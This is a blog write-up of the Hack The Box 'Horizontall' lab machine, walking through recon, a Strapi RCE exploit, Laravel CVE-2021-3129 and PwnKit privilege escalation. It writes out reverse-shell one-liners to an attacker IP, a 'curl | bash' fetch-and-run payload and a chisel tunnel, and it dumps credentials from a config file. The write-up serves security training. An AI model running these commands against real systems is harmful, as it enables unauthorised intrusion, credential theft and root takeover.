---
layout: post
title:  "Horizontall Writeup - Hack The Box"
date:   2023-11-07
desc: "Information Leakage, Strapi Exploitation, Laravel Exploitation"
keywords: "HTB,eJPT,eWPT,Linux,Easy,Information Leakage, Strapi, Laravel"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,Easy,Information Leakage,Strapi,Laravel]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I continue with my practice to improve my skills in the field of pentesting, now it's time to perform the [Hack The Box](https://www.hackthebox.com/){:target="_blank"} **Horizontall** box, which is a machine with a Linux operating system and rated by the community as **Easy**. I'm already improving and respecting the methodology to obtain the results in a more efficient way, a good enumeration is the key to start on the right foot.

<br/><br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I use the **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** script to deploy the box, and I can start the reconnaissance phase. Taking advantage of the **TTL** (amount of time or "hops") I can have some certainty about the operating system of the box. With `nmap` I discover the exposed ports on the victim machine, in this case there are only two, **22** and **80**, which by default are the **SSH** and **HTTP** protocol.

```bash
./htbExplorer -d Horizontall
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.105 -oG allPorts
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am still looking for more information on the services exposed, with `nmap`, using their basic scripts. And with the information obtained I can search the internet for the `codename` with **Launchpad**. It also shows me a url address (**http://horizontall.htb**), which I add to my hosts so that my machine can resolve correctly, once the domain is added I can check that everything works correctly from my shell and from the browser.

```bash
nmap -sCV -p22,80 10.10.11.105 -oN targeted

cat targeted

# OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
# google.com--> OpenSSH 7.6p1 4ubuntu0.5 launchpad
# Bionic

# nginx 1.14.0
# google.com --> nginx 1.14.0 launchpad
# Bionic

nvim /etc/hosts
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I want to know what technologies the web service of the victim machine uses, if I use `wathweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, I don't have much information that can help me at the moment. I browse a bit through the web page and it seems to have very little content, there is a form to **contact**, but analyzing the source code I see that it does not have any actic functionality associated.

```bash
whatweb http://10.10.11.105
```
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try to enumerate the web service with `wfuzz`, looking for subdirectories or subdomains, but I can't find anything. I look at the source code of the web page and I can see some `javascript` file paths.

```bash
wfuzz -c -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
wfuzz -c --hc=404 --hh=901 -L -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.horizontall.htb" http://10.10.11.105/
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I'm going to use my shell to access the **.js** content, but to make the screen output clearer I'm going to use **[htmlq](https://github.com/mgdm/htmlq){:target="_blank"}** tool. Unfortunately on my machine, due to version errors of the `cargo` binary, I can not install it, I looked for different ways and they take me a long time, I will leave it for another time, now I will only resort to the basic Linux commands to order the output.

```bash
apt install cargo
cargo install htmlq
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

When I start to sort and filter the content obtained by making requests from the **shell** with `curl`, it filters a subdomain that I could not find with `wfuzz`, I immediately add it to the list of hosts for the machine to resolve. I access from the browser and [Wappalyzer](https://www.wappalyzer.com/){:target="_blank"} shows me the technology it uses, **Strapi**. And if I access the url that I found I find a response in `json` format, typical of an API endpoint.

> **Strapi** is an open-source, Node. js based, Headless CMS that saves developers a lot of development time while giving them the freedom to use their favorite tools and frameworks. Strapi also enables content editors to streamline content delivery (text, images, video, etc) across any devices.

```bash
curl -s -X GET "http://horizontall.htb/" | cat -l html | grep -oP '".*?"' | grep app\.
curl -s -X GET "http://horizontall.htb/" | cat -l html | grep -oP '".*?"' | grep app\. | sort -u

curl -s -X GET "http://horizontall.htb/js/app.c68eb462.js" | grep -oP '".*?"' | grep http | sort -u
#    --> "http://api-prod.horizontall.htb/reviews"

nvim /etc/hosts
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

With `searchsploit` I look for some exploit for **CMS Strapi**, I find some, but I don't have the **version** that is running the web application. If I make a request with `curl` to the **url** I found, I see the answer and it doesn't help me much. But with `wfuzz` I find other interesting endpoints, but when I resend requests the answers are not the ones I was looking for.

```bash
searchsploit strapi

curl -s -X GET "http://api-prod.horizontall.htb/reviews" | jq

wfuzz -c -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/FUZZ"
wfuzz -c -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/FUZZ"
#    --> users, admin

curl -s -X GET "http://api-prod.horizontall.htb/users" | jq       # Forbidden
curl -s -X GET "http://api-prod.horizontall.htb/admin" | jq       # :( No Json
curl -s -X POST "http://api-prod.horizontall.htb/admin" | jq 
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I use the `feroxbuster` tool to find more directories related to the **API**, but I find the same as with `wfuzz`, I had a problem with this tool, since I look for the dictionary in an path where it does not exist, so I use the `-w` parameter to tell it manually.

```bash
feroxbuster -u http://api-prod.horizontall.htb/ -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access the management url of the API, I can try to enter the default credentials that I found on the internet, but it doesn't work.

> Strapi default credentilas: **admin:admin**

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try to list more directories but in the **API** administration address, I find **three** more endpoints. When sending `curl` requests to one of the endpoints I find a valuable piece of information, the **Strapi version**.

```bash
wfuzz -c --hc=404,403 -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://api-prod.horizontall.htb/users/FUZZ
#   :(

wfuzz -c -t 200 --hc=404 --hh=854 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/admin/FUZZ"
#   --> init, plugins, layout

curl -s -X GET "http://api-prod.horizontall.htb/admin/init" | jq
#    --> "strapiVersion": "3.0.0-beta.17.4"
```

<br>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I know the version of **CMS Strapi**, with `searchsploit` I search for an expolit that applies to the version. I download the exploit on my machine and test it, and I get an **RCE** on the victim machine, if I listen for **ICMP** requests on my machine I also check that I have connectivity to it through the **RCE**.

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try different ways to send me a **Reverse Shell** to my machine, and with the help of **[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** I get one with an **one line** that is mentioned on the page. I make a treatment of the console to have a better fluency in the exploitation phase, I check that the codename is the same as the one that Launchpad informed me (**bionic**).

```bash
searchsploit                                    # 50239.py
searchsploit -m multiple/webapps/50239.py
mv 50239.py strapi_exploit.py

tcpdump -i tun0 icmp -n
python3 strapi_exploit.py http://api-prod.horizontall.htb/

  $> ping -c 1 10.10.14.6                       # :)

nc -nlvp 443
  $> nc -e /bin/bash 10.10.14.6 443                                 # :(
  $> bash -i >& /dev/tcp/10.10.14.26/443 0>&1                       # :(
  $> bash -c 'bash -i >& /dev/tcp/10.10.14.29/443 0>&1'             # :)
```

```bash
script /dev/null -c bash    [Ctrl+z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I make a quick listing in the current directory, to which the **Rerverse Shell** sent me and I find a very striking `config` directory, when I explore it further I find a file with credentials to access the database administrator. I log in and perform a couple of queries but I find credentials generated by the expoloit I used, so they will not be useful for an **User Pivoting** or **Privilege Escalation**.

```bash
cat environments/development/database.json

mysql -udeveloper -p
    /> show databases;
    /> use strapi;
    /> show tables;
    /> describe strapi_administrator;
    /> SELECT username,password FROM strapi_administrator;
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I look in the `passwd` file for those users that have a **shell** assigned to them, there are only three. I check if I can read the user's flag, and I can, which makes me suspect that I'm going to have to **rooted** this machine directly.

```bash
cat /etc/passwd | grep 'sh$'
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I list the system to find some attack vector, if I look at the binaries with **SUID** permissions I find the `pkexec`, but I will not try to exploit it first, I will look for another way first. If I look for any open port but not accessible from my machine, I find a web service on port **8000**, and if I make a request with `curl`, it shows me the **Laravel** version and the **PHP** it uses. 

```bash
find \-perm -4000 2>/dev/null
#    --> ./usr/bin/pkexec                :):):)

cat /etc/crontab
netstat -nat
#    --> 127.0.0.1:8000

curl http://localhost:8000
#    --> Laravel v8 (PHP v7.4.18)
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search the internet for vulnerabilities in Larabel (**laravel 8 php 7.4 vulnerabilities**), I find information about a **CVE** on the **exploit-db** page ([Laravel 8.4.2 debug mode - Remote code execution](https://www.exploit-db.com/exploits/49424){:target="_blank"}). Then I look for some **POC** on **Github** (**laravel cve 2021-3129 exploit github**) that I can use and I find several projects, I choose the first one to clone in the project on my machine (**[nth347/CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit){:target="_blank"}**), once done I test that it works correctly. I will use **[chisel](https://github.com/jpillora/chisel){:target="_blank"}** to create a tunnel to the machine, this way I will access port **8000** of the victim machine from my port **8000** to exploit it.

```bash
git clone https://github.com/nth347/CVE-2021-3129_exploit
python3 exploit.py                      # :)

git clone https://github.com/jpillora/chisel
go build -ldflags "-s -w" .

apt install upx-ucl
upx chisel
du -hc chisel                           # --> 3.0M        :)
chmod +x chisel


python -m http.server 80

# Victim Machine
cd /tmp
wget http://10.10.14.29/chisel
chmod +x chisel

# Attacking Machine
./chisel server --reverse -p 1234

# Victim Machine
./chisel client 10.10.14.29:1234 R:9000:127.0.0.1:8000

# Attacking Machine
lsof -i:9000                                    # :)
nmap -p8000 --open -T5 -v -n 127.0.0.1
#    --> 8000/tcp open  http-alt                :)
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try to get an **RCE** with the expolit, but for some reason I get no results, I change the port of my machine that I am using for the tunnel (**9000**), but nothing. I try with other exploits: **[joshuavanderpoll/CVE-2021-3129](https://github.com/joshuavanderpoll/CVE-2021-3129){:target="_blank"}**, **[zhzyker/CVE-2021-3129](https://github.com/zhzyker/CVE-2021-3129){:target="_blank"}**, all work correctly but I don't get the **RCE**. I access the website from the browser and I can see the service working.

```bash
python3 exploit.py http://127.0.0.1:9000 Monolog/RCE1 whoami        # :(

git clone https://github.com/joshuavanderpoll/CVE-2021-3129.git
python3 CVE-2021-3129.py --host http://127.0.0.1:9000 --chain Laravel/RCE2 --force

git clone https://github.com/zhzyker/CVE-2021-3129.git
python3 exp.py http://127.0.0.1:9000
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Finally I find the problem, because I don't have **PHP** installed on my machine, that's why the exploits don't work. Once installed I see that the exploits work and perform an **RCE**.

```bash
apt install php
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_43.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_44.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I can execute commands on the victim machine, I see if I can send myself an **Reverse Shell**, and also verify that I will be the `root` user of the victim machine. I try several **one line** but they do not work, better I create a malicious **index.html** file with `bash` code, I create a local server with `python`, and from the attacking victim machine I download the malicious file with `curl`, at the same time I execute its code with `bash`, so I get a shell, and as the **root** user.

```bash
nc -nlvp 443

python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
# :(

python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"
# :(

nvim index.html
python3 -m http.server 80
nc -nlvp 443

python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 'curl 10.10.14.6 | bash'
# :):)
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_45.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_46.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_47.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am going to try to exploit the `pkexec` binary, for that I download the **[berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034){:target="_blank"}** exploit, I download it in the victim machine in a directory where I have permissions to execute it (**tmp** or **dev/shm**). I had not noticed to see if `gcc` is installed on the machine, but I look for it and luckily it is. I compile the exploit and run it, and I escalate privileges to the **root** user.

> **[Watchguard](https://www.watchguard.com/es/wgrd-psirt/advisory/wgsa-2022-00001){:target="_blank"}**: On 25 January 2022, researchers at Qualys revealed a memory corruption vulnerability in Polkit’s **pkexec** tool, present in most major Linux distributions since 2009. An attacker with local access to a vulnerable system could exploit this vulnerability to elevate their privileges to root. Polkit (previously known as PolicyKit) is used for inter-process communication between privileged and non-privileged processes on Linux systems. The pkexec command is used by authorized users to execute commands at elevated privileges (like using sudo). WatchGuard is currently reviewing all of its products and services and so far has determined that none of its products and services are vulnerable to CVE-2021-4034 (PwnKit).

```bash
git clone https://github.com/berdav/CVE-2021-4034
zip -r exploit.zip CVE-2021-4034
python3 -m http.server 80


# Victim Machine
wget http://10.10.14.6/compressed.zip
unzip exploit.zip
cd CVE-2021-4034/
make
./cve-2021-4034
```

<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_48.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/horizontall_writeup/Horizontall_49.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> Another box done, I am assimilating the concepts the more I practice. Now I kill the box and go for the next one.

```bash
./htbExplorer -k Horizontall
```
